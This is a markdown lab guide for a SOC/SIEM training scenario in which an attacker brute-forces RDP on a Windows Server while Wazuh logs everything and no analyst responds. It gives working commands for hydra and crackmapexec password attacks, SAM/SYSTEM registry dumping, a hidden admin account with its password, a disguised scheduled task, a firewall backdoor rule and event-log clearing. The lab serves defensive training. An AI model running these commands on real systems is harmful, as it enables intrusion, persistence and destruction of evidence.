# 🟧 Scenario 2 — Good SIEM, Weak SOC Response  
### *Attacker succeeds again — logs improve, but no one reacts*

This scenario demonstrates a realistic situation where:  
- Logging quality has increased after Scenario 1  
- Sysmon is now installed  
- Wazuh SIEM receives rich telemetry  
- Passwords are stronger (user changed to a personal OSINT-based password)  
- BUT the SOC still does **not respond** to alerts  

The attacker performs an OSINT-based password attack, gains access, runs advanced post-exploitation steps, establishes a hidden backdoor for future attacks, performs partial cleanup, and leaves — while the SIEM logs everything, but the SOC ignores it.

---

# 🟦 1. Environment Overview (After Scenario 1 Improvements)

The company made corrections after Scenario 1, but not enough.

## 🔐 Password & Account Security
- Password complexity: **Enabled**
- Minimum password length: **8**
- Lockout threshold: **Still disabled**
- User changed password to a **personal, OSINT-derived password**  
  → You will use: **\<OSINT_PASSWORD\>**

**Screenshot:**  
➡️ secpol.msc → Password Policy  
➡️ secpol.msc → Account Lockout Policy

---

## 📊 Logging & Visibility (Improved)

### ✔ Audit Policy Updated
- 4624/4625 Logon events → enabled  
- 4688 New Process → enabled  
- 4663 Object access → partially enabled  
- 4697 Service installation → enabled  
- PowerShell logging → enabled (`ScriptBlockLogging`, `ModuleLogging`)

**Screenshot:**  
➡️ Local Security Policy → Advanced Audit Policy Configuration

---

## 👁️ Sysmon Visibility (Installed)

Sysmon now active:

- Event ID 1 → Process creation  
- Event ID 3 → Network connections  
- Event ID 11 → File creation  
- Event ID 12/13 → Registry changes  

**Screenshot:**  
➡️ `Get-Service sysmon*`  
➡️ Sysmon Event Log

---

## 📡 Wazuh Agent State (Fixed)

Wazuh agent now properly forwards:

- Windows Security logs  
- Sysmon logs  
- PowerShell Operational logs  
- Event Channel data  

**Screenshot:**  
➡️ Wazuh dashboard → Incoming Windows logs  
➡️ Sysmon event entries visible

---

## 🧱 Network Exposure (Unchanged)

- RDP (3389) still exposed  
- No MFA  
- No geoblocking  
- No rate limiting  
- No detection rules built for password attacks  

---

# 📌 Summary

The SIEM is now strong.  
The SOC team is still weak.  
This scenario illustrates that **visibility ≠ security**.

---

# 🟠 2. Before Starting Scenario 2

### ✔ Snapshot Windows Server  
Name: `scenario2_start_windows`

### ✔ Snapshot Kali Linux  
Name: `scenario2_start_kali`

### ✔ Confirm OSINT files exist  
- `usernames.txt`  
- `osint_passwords.txt`

---

# 🟧 3. Initial Access — OSINT-Based Login Attack

## 3.1 Username Enumeration (From Kali)

```bash
for user in $(cat usernames.txt); do
    xfreerdp /v:<WINDOWS_IP> /u:$user /p:RandomPassword123 /cert:ignore
done
```

Expected:
- Incorrect username → immediate failure  
- Correct username → different failure timing  

**Screenshot:**  
➡️ Terminal showing the valid username (e.g., `akovacs`)

---

## 3.2 OSINT-Based Password Brute Force

```bash
hydra -L usernames.txt -P osint_passwords.txt rdp://<WINDOWS_IP>
```

OR using CME:

```bash
crackmapexec rdp <WINDOWS_IP> -u usernames.txt -p osint_passwords.txt
```

**Expected:**
- SIEM logs many 4625 failed attempts  
- Eventually → successful login for one user  

**Screenshot:**  
➡️ Hydra/CME success output  
➡️ Wazuh showing failed auth spam

---

# 🟧 4. RDP Login — Access Achieved

```bash
xfreerdp /v:<WINDOWS_IP> /u:<VALID_USERNAME> /p:<OSINT_PASSWORD> /cert:ignore
```

**Screenshot:**  
➡️ Logged-in Windows Server desktop

---

# 🟦 5. On-System Actions (Advanced Attacker Activity)

Run inside the RDP session.

---

## 5.1 Basic Recon

```powershell
whoami
hostname
systeminfo
```

**SIEM visibility:**  
- 4688 (process creation)  
- Sysmon ID 1 events  

**Screenshot:** combined output

---

## 5.2 Local User Enumeration

```powershell
net user
Get-LocalUser
```

---

## 5.3 PowerShell Recon

```powershell
Get-ChildItem C:\Users
Get-Process
Get-Service
```

Produces PowerShell ScriptBlock logs (4104).

---

# 🟥 6. Credential Exploration Attempts

## Registry dump attempt (SAM / SYSTEM)

```powershell
reg save HKLM\SAM C:\temp\sam.save
reg save HKLM\SYSTEM C:\temp\system.save
```

Expected:
- Access denied  
- Sysmon ID 11 visibility  

**Screenshot:**  
➡️ PowerShell error + Sysmon event

---

# 🟦 7. Network Discovery

```powershell
test-connection <KALI_IP>
net view
ipconfig /all
```

SIEM will log:
- Sysmon ID 3 (network connections)  
- Possible suspicious recon patterns  

---

# 🟪 8. Persistence Backdoor (Stealth) — **Critical for Scenario 3**

Before leaving, the attacker silently plants a **long-term persistence mechanism**  
that will be reused in Scenario 3.

---

## 8.1 Create a Hidden Administrator Account

```powershell
net user backupadmin Winter2024! /add
net localgroup Administrators backupadmin /add
```

Why SOC misses it:
- No alerting rule for:
  - 4720 (user created)  
  - 4732 (user added to Administrators)  
- “backupadmin” appears legitimate  
- Analysts are not reviewing logs

**Screenshot (optional):**  
➡️ `net user` showing new account  
➡️ Wazuh events ignored

---

## 8.2 Create a Fake Administrative Scheduled Task

```powershell
schtasks /create /tn "SystemBackupTask" /tr "cmd.exe /c exit" /sc weekly /ru backupadmin
```

This:
- Looks like a routine IT job  
- Executes harmlessly  
- Generates logs, but SOC ignores them

---

## 8.3 Optional Network Backdoor

```powershell
netsh advfirewall firewall add rule name="Backup WinRM" dir=in action=allow protocol=TCP localport=5987
```

Provides:
- An alternative entry point  
- Zero alerts due to lack of monitoring  

---

# 🟪 Summary of Persistence Left Behind

| Backdoor | Details |
|---------|---------|
| Hidden admin user | `backupadmin` / `Winter2024!` |
| Scheduled task | `SystemBackupTask` |
| Optional firewall rule | Port 5987 open |
| SOC reaction | None |

This sets the foundation for **Scenario 3**,  
where the attacker will try to return using this stealth backdoor.

---

# 🟫 9. Cleanup Attempts

## 9.1 PowerShell History Removal

```powershell
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

---

## 9.2 Event Log Clear Attempt

```powershell
wevtutil cl Security
```

**Expected:**  
- HIGH alert in SIEM  
- SOC **still ignores it**

---

# 🚪 10. Attacker Exit

```powershell
logoff
```

---

# 🟦 11. What the SIEM Saw

### ✔ Username enumeration  
### ✔ OSINT password spray  
### ✔ Successful logon  
### ✔ Reconnaisance commands  
### ✔ PowerShell scriptblock logs  
### ✔ Scheduled task creation  
### ✔ New local admin user (ignored)  
### ✔ Firewall modification (ignored)  
### ✔ Log clearing attempt  

### ❌ SOC Response  
**No action taken. No escalation.**

---

# 🟦 12. Lessons Learned

The company realizes the need for:

- User creation alerts  
- Admin group change detection  
- Firewall modification monitoring  
- Scheduled task detection rules  
- SOC playbooks  
- Better analyst training  

This directly leads into **Scenario 3**,  
where the SOC will finally detect malicious activity quickly.

---

# ✔ End of Scenario 2  
**Take snapshots:**

- Windows → `scenario2_end_windows`  
- Kali → `scenario2_end_kali`
